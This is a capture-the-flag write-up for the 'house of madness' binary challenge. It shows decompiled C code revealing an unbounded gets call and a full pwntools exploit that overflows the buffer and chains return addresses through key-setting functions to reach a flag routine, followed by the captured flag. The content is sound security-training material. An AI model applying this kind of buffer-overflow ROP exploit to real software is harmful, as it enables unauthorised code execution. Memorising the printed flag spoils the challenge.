Checksec:
```shell
[marco@marco-xps139343 house of madness]$ checksec --file="challenge"
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   101 Symbols     No	0		3	challenge
```
The challenge told us the ASLR is disabled. So even if the PIE flag is raised there is no randomizazion.

Main:
```c
//DECOMPILED WITH IDAPRO
void __noreturn game()
{
  signed int v0; // eax
  char v1; // [esp+Fh] [ebp-9h]

  while ( 1 )
  {
    menu();
    v1 = get_input("Your choice: ");
    puts("\n");
    switch ( v1 )
    {
      case 49:
        puts("You can go into:\n Room 1\n Room 2\n Room 3\n Room 4\n");
        break;
      case 50:
        v0 = (char)get_input("Choose a room to enter: ");
        if ( v0 == 52 )
        {
          isInRoom1 = 0;
          isInRoom2 = 0;
          isInRoom3 = 0;
          isInRoom4 = 1;
        }
        else
        {
          if ( v0 <= 52 )
          {
            if ( v0 == 51 )
            {
              isInRoom1 = 0;
              isInRoom2 = 0;
              isInRoom3 = 1;
              isInRoom4 = 0;
              break;
            }
            if ( v0 <= 51 )
            {
              if ( v0 == 49 )
              {
                isInRoom1 = 1;
                isInRoom2 = 0;
                isInRoom3 = 0;
                isInRoom4 = 0;
                break;
              }
              if ( v0 == 50 )
              {
                isInRoom1 = 0;
                isInRoom2 = 1;
                isInRoom3 = 0;
                isInRoom4 = 0;
                break;
              }
            }
          }
          puts("Enter a proper room number!");
        }
        break;
      case 51:
        if ( isInRoom1 )
        {
          puts("Hello, this is just a plain old room. Poke around the others");
        }
        else if ( isInRoom2 )
        {
          puts((const char *)&unk_20D4);
        }
        else if ( isInRoom3 )
        {
          puts("Have you tried ALL the options?");
        }
        else if ( isInRoom4 )
        {
          room4();
        }
        else
        {
          puts("You aren't in a room!!");
        }
        break;
      case 52:
        puts(
          "Wait a minute. This doesn't quit the program... Weird. Hey try entering 'Stephen' in Room 4. I heard the room's magic");
        break;
      default:
        puts("You didn't enter a proper option. Try Again!");
        break;
    }
    putchar(10);
  }
}
```

room4:
```c
char *room4()
{
  char *result; // eax
  char s1; // [esp+0h] [ebp-28h]
  char s; // [esp+10h] [ebp-18h]

  puts("Wow this room is special. It echoes back what you say!");
  while ( !unlockHiddenRoom4 )
  {
    printf("Press Q to exit: ");
    fgets(&s1, 16, stdin);
    remove_newline(&s1);
    printf("\tYou entered '%s'\n", &s1);
    result = (char *)strcmp(&s1, "Q");
    if ( !result )
      return result;
    if ( !strcmp(&s1, "Stephen") )
      unlockHiddenRoom4 = 1;
  }
  puts("Welcome to the hidden room! Good Luck");
  printf("Enter something: ");
  return gets(&s);
}
```

last gets could be used in order to inject a ROPchain.
There is a getflag function:
```c
int get_flag()
{
  int result; // eax
  char s; // [esp+Ch] [ebp-5Ch]
  FILE *stream; // [esp+4Ch] [ebp-1Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("'flag.txt' missing in the current directory!");
    exit(0);
  }
  if ( key1 && key2 && !strcmp(key3, "Dormammu") && !__PAIR__(key4 ^ 0x616E6765u, dword_405C ^ 0x537472u) )
  {
    fgets(&s, 64, stream);
    result = printf("Damn you beat the house: %s\n", &s);
  }
  else if ( key1 && key2 && !strcmp(key3, "Dormammu") )
  {
    result = printf("Surrender, Stephen. Surrender to the reverser");
  }
  else if ( key1 && key2 )
  {
    result = puts("You think you are ready? You are ready when the relic decides you are ready.");
  }
  else
  {
    result = printf("It's not going to be that easy. Come on");
  }
  return result;
}
```

getkey1:
```c
int __cdecl get_key1(int a1)
{
  int result; // eax

  result = 0x4000;
  if ( isInRoom == 1 || a1 != -17973026 )
  {
    if ( isInRoom == 1 )
    {
      if ( isInRoom )
        result = puts("Haha this house is special.");
      else
        result = puts("Need to get the right keys. Reverse the house harder");
    }
    else
    {
      result = puts("Your very close to getting the key...solve one more riddle and the key is yours. Reverse the house");
    }
  }
  else
  {
    key1 = 1;
  }
  return result;
}
```

getkey2:
```c
int get_key2()
{
  int result; // eax

  if ( key1 == 1 )
    return puts("Need to get the right keys. Reverse the house harder");
  result = strcmp(key3, "Dormammu");
  if ( result )
    return puts("Need to get the right keys. Reverse the house harder");
  key2 = 1;
  return result;
}
```
AAsDrwEk (getkey3):
```c
signed int AAsDrwEk()
{
  signed int result; // eax

  result = 0x4000;
  key3 = "Dormammu";
  return result;
}
```

setkey4:
```c
int set_key4()
{
  int result; // eax

  if ( isInRoom == 1 )
    return puts("Need to get the right keys. Reverse the house harder");
  if ( !key1 )
    return puts("Need to get the right keys. Reverse the house harder");
  if ( !key2 )
    return puts("Need to get the right keys. Reverse the house harder");
  result = strcmp(key3, "Dormammu");
  if ( result )
    return puts("Need to get the right keys. Reverse the house harder");
  key4 = 1634625381;
  dword_405C = 5469298;
  return result;
}
```

We need to trigger every of theese four functions (eventually with parameters) with this order:
AAsDrwEk --> getkey2 --> getkey1 --> setkey4 --> getflag

To clean the stack parameter of getkey1 i used the gadget at: 0x565567e7

Exploit:
```python
from pwn import *

fkey1 = 0x565566de
fkey2 = 0x5655676e
fkey3 = 0x565567cd
fkey4 = 0x565567e9
get_flag = 0x5655686b
clean_stack = 0x565567e7

p = remote('challenges.auctf.com', 30012)
#p = process('./challenge')
print(p.recvuntil('choice: ').decode())
payload = ("2".encode())
p.sendline(payload)
print(p.recvuntil('enter: ').decode())
payload = ("4".encode())
p.sendline(payload)
print(p.recvuntil('choice: ').decode())
payload = ("3".encode())
p.sendline(payload)
print(p.recvuntil('exit: ').decode())
payload = ("Stephen".encode())
p.sendline(payload)
print(p.recvuntil('something: ').decode())
payload = (("A"*28).encode())
payload += p32(fkey3)
payload += p32(fkey2)
payload += p32(fkey1)
payload += p32(clean_stack)
payload += p32(0xfeedc0de)
payload += p32(fkey4)
payload += p32(get_flag)
p.sendline(payload)
print(p.recvall().decode())
```

# FLAG
`auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}`


